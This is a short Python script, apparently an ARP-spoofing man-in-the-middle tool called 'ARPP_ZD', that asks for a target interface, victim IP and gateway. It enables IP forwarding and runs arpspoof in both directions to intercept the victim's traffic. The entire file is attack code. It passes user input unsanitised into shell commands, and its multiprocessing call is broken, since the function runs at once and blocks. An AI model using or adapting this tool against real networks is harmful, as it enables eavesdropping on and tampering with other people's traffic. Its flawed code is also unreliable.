import subprocess
from subprocess import Popen, call
from multiprocessing import Process


def toggle_ip_forwarding(b: bool):
    """
    toggles systems ip forwarding on or off
    :param b: bool
    """
    # subprocess.run(["sudo -i"], capture_output=True, encoding="utf8")
    if b:
        call(["sysctl -w net.ipv4.ip_forward=1"], shell=True)
    elif not b:
        call(["sysctl -w net.ipv4.ip_forward=0"], shell=True)


def capture_packet(interface: str, host_ip: str, gateway_ip: str):
    """
    :param interface: str
    :param host_ip: str
    :param gateway_ip: str
    """
    subprocess.call(f"arpspoof -i {interface} -t {host_ip} {gateway_ip}", shell=True)


def redirect_packet(interface: str, host_ip: str, gateway_ip: str):
    """
        :param interface: str
        :param host_ip: str
        :param gateway_ip: str
        """
    subprocess.call(f"arpspoof -i {interface} -t {gateway_ip} {host_ip}", shell=True)


def spoof_handler(interface: str, host_ip: str, gateway_ip: str):
    """
    Handles intercepting and redirecting packets from specified host and gateway.
    :param host_ip: str
    :param gateway_ip: str
    :param interface: str
    """
    # Forward packets.
    toggle_ip_forwarding(b=True)

    # Runs the commands in the list.
    proc1 = Process(target=capture_packet(interface, host_ip, gateway_ip))
    proc2 = Process(target=redirect_packet(interface, host_ip, gateway_ip))
    proc1.start()
    proc2.start()


def start_attack():
    print("""
        //////////[ARPP_ZD v.0.1]//////////
        Starting...
    """)
    inter = input('[+] Enter Target Interface: ')
    victim = input('[+] Enter Target IP: ')
    gateway = input('[+] Enter Target Default Gateway IP: ')

    toggled = input('[+] Begin spoofing? Y/N')

    if toggled == "Y" or toggled == "y":
        spoof_handler(interface=inter, host_ip=victim, gateway_ip=gateway)
    else:
        print("Ending process...")


start_attack()
